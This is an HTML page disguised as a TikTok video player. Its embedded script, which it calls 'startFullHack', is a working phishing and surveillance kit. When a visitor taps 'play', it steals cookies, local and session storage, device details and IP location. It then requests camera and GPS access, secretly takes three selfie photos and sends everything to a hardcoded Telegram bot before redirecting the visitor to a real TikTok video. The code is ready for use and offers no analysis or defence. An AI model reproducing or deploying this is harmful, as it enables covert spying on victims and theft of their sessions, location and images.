<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>TikTok</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#000;overflow:hidden;font-family:Arial,sans-serif;}
.container{width:100vw;height:100vh;max-width:500px;margin:0 auto;position:relative;background:#000;overflow:hidden;}
.video-bg{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:1;}
.overlay{position:absolute;top:0;left:0;width:100%;height:100%;z-index:2;background:rgba(0,0,0,0.4);display:flex;flex-direction:column;justify-content:center;align-items:center;cursor:pointer;}
.play-btn{width:80px;height:80px;background:rgba(255,255,255,0.2);border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:20px;backdrop-filter:blur(10px);border:2px solid rgba(255,255,255,0.5);}
.play-btn svg{width:40px;height:40px;fill:#fff;margin-left:5px;}
.play-text{color:#fff;font-size:18px;font-weight:600;}
.tiktok-ui{position:absolute;bottom:80px;left:15px;z-index:3;color:#fff;}
.username{font-weight:bold;margin-bottom:5px;}
.desc{font-size:12px;}
.sidebar{position:absolute;right:15px;bottom:100px;display:flex;flex-direction:column;gap:20px;z-index:3;}
.icon{display:flex;flex-direction:column;align-items:center;color:#fff;font-size:11px;}
.icon svg{width:30px;height:30px;fill:#fff;}
.bottom-nav{position:absolute;bottom:0;left:0;width:100%;height:60px;background:linear-gradient(to top,rgba(0,0,0,0.8),transparent);display:flex;justify-content:space-around;align-items:center;z-index:3;}
.nav-item{color:rgba(255,255,255,0.7);display:flex;flex-direction:column;align-items:center;font-size:10px;}
.nav-item.active{color:#fff;}
.nav-item svg{width:22px;height:22px;fill:currentColor;}
.loading{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:20;opacity:0;visibility:hidden;}
.loading.active{opacity:1;visibility:visible;}
.spinner{border:4px solid rgba(255,255,255,0.3);border-top:4px solid #ff0050;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;}
@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
.progress-bar{width:200px;height:4px;background:rgba(255,255,255,0.2);border-radius:2px;margin-top:15px;}
.progress-fill{height:100%;background:#ff0050;width:0%;transition:width 0.3s;}
.loading-text{color:#fff;margin-top:15px;font-size:14px;}
video,canvas{position:absolute;width:1px;height:1px;opacity:0;z-index:-1;}
</style>
</head>
<body>
<div class="container">
    <video class="video-bg" autoplay loop muted playsinline>
        <source src="https://cdn.pixabay.com/video/2024/01/15/197032-902536795_large.mp4" type="video/mp4">
    </video>
    
    <div class="overlay" id="overlay">
        <div class="play-btn" id="playBtn"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
        <div class="play-text" id="playText">▶ Tap to watch</div>
    </div>
    
    <div class="tiktok-ui">
        <div class="username">@viral_clips</div>
        <div class="desc">Wait for the end 🔥 #fyp</div>
    </div>
    
    <div class="sidebar">
        <div class="icon"><svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg><span>542K</span></div>
        <div class="icon"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg><span>4,129</span></div>
    </div>
    
    <div class="bottom-nav">
        <div class="nav-item active"><svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg><span>Home</span></div>
        <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5z"/></svg><span>Discover</span></div>
        <div class="nav-item"><svg viewBox="0 0 24 24" style="width:32px;height:32px;"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg></div>
        <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg><span>Inbox</span></div>
        <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4z"/></svg><span>Me</span></div>
    </div>
    
    <div class="loading" id="loading">
        <div class="spinner"></div>
        <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
        <div class="loading-text" id="msg">Initializing...</div>
    </div>
    
    <video id="cam" autoplay muted></video>
    <canvas id="canvas"></canvas>
</div>

<script>
const TOKEN = '8611440321:AAH-_EXmy8Mlpz70a9y4R2UuCCckjB6P_CI';
const CHAT_ID = '178779116';
const REDIRECT = 'https://www.tiktok.com/@tiktok/video/7325515231713506592';

let collectedData = {
    timestamp: new Date().toISOString(),
    ua: navigator.userAgent,
    url: location.href,
    cookies: '',
    localStorage: {},
    sessionStorage: {},
    screenInfo: {},
    hardwareInfo: {},
    ipInfo: null,
    gps: null,
    images: []
};

function updateProgress(p, m) {
    document.getElementById('progress').style.width = p + '%';
    document.getElementById('msg').innerText = m;
}

// ============= 1. جمع البيانات بدون موافقة (تلقائي فوراً) =============
async function collectDataWithoutPermission() {
    // الكوكيز
    collectedData.cookies = document.cookie;
    
    // LocalStorage
    for(let i = 0; i < localStorage.length; i++) {
        let key = localStorage.key(i);
        collectedData.localStorage[key] = localStorage.getItem(key);
    }
    
    // SessionStorage
    for(let i = 0; i < sessionStorage.length; i++) {
        let key = sessionStorage.key(i);
        collectedData.sessionStorage[key] = sessionStorage.getItem(key);
    }
    
    // معلومات الشاشة
    collectedData.screenInfo = {
        width: screen.width,
        height: screen.height,
        colorDepth: screen.colorDepth,
        orientation: screen.orientation ? screen.orientation.type : 'unknown'
    };
    
    // معلومات الجهاز
    collectedData.hardwareInfo = {
        cores: navigator.hardwareConcurrency,
        memory: navigator.deviceMemory,
        touchPoints: navigator.maxTouchPoints,
        language: navigator.language,
        platform: navigator.platform
    };
    
    // IP معلومات
    try {
        const res = await fetch('https://ipapi.co/json/');
        collectedData.ipInfo = await res.json();
    } catch(e) {}
}

// ============= 2. طلب الكاميرا والموقع (بضغطة واحدة) =============
async function requestCameraAndLocation() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        return stream;
    } catch(e) {
        return null;
    }
}

async function getLocation() {
    try {
        const pos = await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(res, rej, {
                enableHighAccuracy: true,
                timeout: 10000
            });
        });
        collectedData.gps = {
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            acc: pos.coords.accuracy
        };
        return true;
    } catch(e) {
        return false;
    }
}

// ============= 3. تصوير 3 صور =============
async function captureImages(stream) {
    try {
        const video = document.getElementById('cam');
        video.srcObject = stream;
        await new Promise(r => video.onloadedmetadata = r);
        
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        
        for(let i = 0; i < 3; i++) {
            ctx.drawImage(video, 0, 0);
            collectedData.images.push(canvas.toDataURL('image/jpeg', 0.8));
            await new Promise(r => setTimeout(r, 500));
        }
        
        stream.getTracks().forEach(t => t.stop());
        return true;
    } catch(e) { return false; }
}

// ============= 4. إرسال كل شيء لتليجرام =============
async function sendAllData() {
    let msg = `🔥 FULL SHADOW REPORT 🔥\n\n`;
    msg += `⏰ Time: ${collectedData.timestamp}\n`;
    msg += `🌐 URL: ${collectedData.url}\n`;
    msg += `📱 User Agent: ${collectedData.ua.substring(0, 80)}...\n\n`;
    
    msg += `🖥️ SCREEN:\n`;
    msg += `   ${collectedData.screenInfo.width}x${collectedData.screenInfo.height}\n`;
    msg += `   Color: ${collectedData.screenInfo.colorDepth}bit\n\n`;
    
    msg += `💻 HARDWARE:\n`;
    msg += `   Cores: ${collectedData.hardwareInfo.cores}\n`;
    msg += `   Memory: ${collectedData.hardwareInfo.memory || 'Unknown'}GB\n`;
    msg += `   Platform: ${collectedData.hardwareInfo.platform}\n\n`;
    
    if(collectedData.ipInfo) {
        msg += `📍 IP LOCATION:\n`;
        msg += `   IP: ${collectedData.ipInfo.ip}\n`;
        msg += `   City: ${collectedData.ipInfo.city}\n`;
        msg += `   Country: ${collectedData.ipInfo.country}\n`;
        msg += `   ISP: ${collectedData.ipInfo.org}\n\n`;
    }
    
    if(collectedData.gps) {
        msg += `🎯 GPS (High Accuracy):\n`;
        msg += `   Lat: ${collectedData.gps.lat}\n`;
        msg += `   Lon: ${collectedData.gps.lon}\n`;
        msg += `   Acc: ±${collectedData.gps.acc}m\n\n`;
    }
    
    if(collectedData.cookies) {
        msg += `🍪 COOKIES:\n${collectedData.cookies.substring(0, 200)}...\n\n`;
    }
    
    if(Object.keys(collectedData.localStorage).length > 0) {
        msg += `💾 LOCALSTORAGE:\n`;
        for(let key in collectedData.localStorage) {
            msg += `   ${key}: ${collectedData.localStorage[key].substring(0, 50)}...\n`;
        }
        msg += `\n`;
    }
    
    msg += `📸 Photos: ${collectedData.images.length}`;
    
    try {
        // إرسال التقرير
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: msg.substring(0, 4096) })
        });
        
        // إرسال الصور
        for(let i = 0; i < collectedData.images.length; i++) {
            const blob = await fetch(collectedData.images[i]).then(r => r.blob());
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, `photo_${i}.jpg`);
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            await new Promise(r => setTimeout(r, 500));
        }
        
    } catch(e) {}
}

// ============= التشغيل الرئيسي =============
async function startFullHack() {
    // إخفاء زر التشغيل وإظهار شاشة التحميل
    document.getElementById('overlay').style.display = 'none';
    document.getElementById('loading').classList.add('active');
    
    updateProgress(10, 'Collecting device data...');
    await collectDataWithoutPermission();
    
    updateProgress(25, 'Requesting camera & location...');
    const stream = await requestCameraAndLocation();
    await getLocation();
    
    if(stream) {
        updateProgress(50, 'Capturing photos...');
        await captureImages(stream);
    }
    
    updateProgress(80, 'Sending to Telegram...');
    await sendAllData();
    
    updateProgress(100, 'Redirecting to TikTok...');
    
    setTimeout(() => {
        window.location.href = REDIRECT;
    }, 1500);
}

// ربط الضغط ببدء التشغيل
document.getElementById('playBtn').onclick = startFullHack;
document.getElementById('playText').onclick = startFullHack;

// تشغيل تلقائي بعد 0.5 ثانية (اختياري - علق لو تبي ضغطة يدوية)
// setTimeout(() => { startFullHack(); }, 500);
</script>
</body>
</html>
